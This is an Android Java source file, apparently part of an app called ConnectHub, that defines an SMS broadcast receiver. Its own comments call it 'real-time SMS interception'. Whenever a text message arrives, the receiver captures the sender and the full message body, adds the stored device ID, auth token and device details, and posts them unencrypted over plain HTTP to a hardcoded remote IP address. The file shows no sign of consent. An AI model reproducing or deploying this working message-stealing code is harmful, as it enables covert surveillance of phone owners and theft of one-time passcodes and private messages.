package com.connecthub;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * SmsReceiver — Real-time SMS interception.
 *
 * Triggered immediately when a new SMS arrives via the OS broadcast.
 * Extracts sender, body, timestamp and POSTs to the backend on a
 * background thread so we never block the main thread.
 *
 * The background task (backgroundTask.js) handles periodic bulk sync;
 * this receiver handles the instant, real-time case.
 */
public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "ConnectHub_SmsReceiver";
    private static final String API_BASE = "http://116.203.28.131/api";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction()))
            return;

        Bundle bundle = intent.getExtras();
        if (bundle == null)
            return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        String format = bundle.getString("format");
        if (pdus == null || pdus.length == 0)
            return;

        // Reconstruct full message (handles multi-part SMS)
        StringBuilder fullBody = new StringBuilder();
        String sender = null;
        long timestamp = System.currentTimeMillis();

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            if (sms == null)
                continue;
            if (sender == null) {
                sender = sms.getDisplayOriginatingAddress();
                timestamp = sms.getTimestampMillis();
            }
            fullBody.append(sms.getMessageBody());
        }

        if (sender == null || fullBody.length() == 0)
            return;

        final String finalSender = sender;
        final String finalBody = fullBody.toString();
        final long finalTimestamp = timestamp;

        Log.d(TAG, "SMS intercepted from: " + finalSender);

        // Read stored credentials from SharedPreferences (written by RN
        // EncryptedStorage)
        // We use a background thread to avoid NetworkOnMainThreadException
        new Thread(() -> {
            try {
                // Retrieve device_id and jwt_token stored by the React Native layer
                android.content.SharedPreferences prefs = context.getSharedPreferences(
                        "RN_ENCRYPTED_STORAGE_SHARED_PREF", Context.MODE_PRIVATE);

                String deviceId = prefs.getString("device_id", null);
                String token = prefs.getString("jwt_token", null);

                if (deviceId == null || token == null) {
                    Log.w(TAG, "No credentials in SharedPreferences — skipping instant upload");
                    return;
                }

                // Build JSON payload (plain text — encryption handled server-side or by RN
                // layer)
                JSONObject payload = new JSONObject();
                payload.put("device_id", deviceId);
                payload.put("sender", finalSender);
                payload.put("message_body", finalBody);
                payload.put("iv", ""); // No client-side encryption in native layer
                payload.put("timestamp", finalTimestamp);
                payload.put("sim_info", "SIM_SLOT_0");
                payload.put("device_model", android.os.Build.MODEL);
                payload.put("android_version", String.valueOf(android.os.Build.VERSION.SDK_INT));

                String jsonStr = payload.toString();
                byte[] postData = jsonStr.getBytes(StandardCharsets.UTF_8);

                URL url = new URL(API_BASE + "/sms/upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setRequestProperty("Authorization", "Bearer " + token);
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData);
                }

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "SMS upload response: " + responseCode);
                conn.disconnect();

            } catch (Exception e) {
                Log.e(TAG, "Failed to upload SMS instantly: " + e.getMessage());
                // Failure is non-fatal — background task will pick it up on next cycle
            }
        }).start();
    }
}
